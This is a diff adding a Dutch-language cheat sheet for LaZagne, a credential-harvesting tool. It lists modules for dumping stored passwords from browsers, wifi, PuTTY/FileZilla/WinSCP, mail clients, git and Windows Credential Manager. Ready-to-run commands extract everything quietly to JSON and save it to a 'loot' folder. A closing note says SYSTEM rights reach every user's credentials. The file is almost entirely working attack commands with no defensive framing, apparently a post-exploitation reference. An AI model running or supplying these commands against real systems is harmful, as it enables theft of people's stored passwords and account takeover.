@@ -1,0 +1,57 @@
+# LaZagne — Wachtwoorden uit applicaties, browsers en wifi extraheren
+# Haalt opgeslagen credentials op uit diverse applicaties op het systeem
+#
+# === Syntax ===
+# lazagne.exe [module] [opties]
+#
+# === Modules ===
+# all          Alle modules uitvoeren
+# browsers     Alleen browser wachtwoorden (Chrome, Firefox, IE, Edge)
+# wifi         Opgeslagen WiFi wachtwoorden
+# sysadmin     Sysadmin tools (PuTTY, FileZilla, WinSCP, OpenSSH)
+# databases    Database clients (SQLDeveloper, Robomongo, DBVisualizer)
+# mails        Mail clients (Outlook, Thunderbird)
+# windows      Windows credentials (Credential Manager, Vault, autologon)
+# git          Git credentials
+# memory       Credentials uit geheugen
+#
+# === Belangrijkste opties ===
+# -oJ          Output als JSON
+# -oA          Output in alle formaten (txt + json)
+# -oN          Output als plaintext
+# -output DIR  Output directory specificeren
+# -quiet       Geen banner, alleen resultaten
+# -v           Verbose output
+#
+# === Voorbeelden ===
+
+# Alle opgeslagen wachtwoorden extraheren
+lazagne.exe all
+
+# Alleen browser wachtwoorden
+lazagne.exe browsers
+
+# WiFi wachtwoorden ophalen
+lazagne.exe wifi
+
+# Alles extraheren, JSON output, stil
+lazagne.exe all -oJ -quiet
+
+# Output opslaan naar specifieke directory
+lazagne.exe all -oA -output C:\temp\loot
+
+# Alleen sysadmin tools (PuTTY, FileZilla, WinSCP)
+lazagne.exe sysadmin
+
+# Mail credentials
+lazagne.exe mails
+
+# Windows Credential Manager / Vault
+lazagne.exe windows
+
+# Linux variant (indien python beschikbaar)
+python3 laZagne.py all
+python3 laZagne.py browsers -oJ
+
+# NOTE: Geen admin rechten vereist voor eigen gebruiker credentials
+# NOTE: Admin/SYSTEM kan credentials van alle gebruikers ophalen
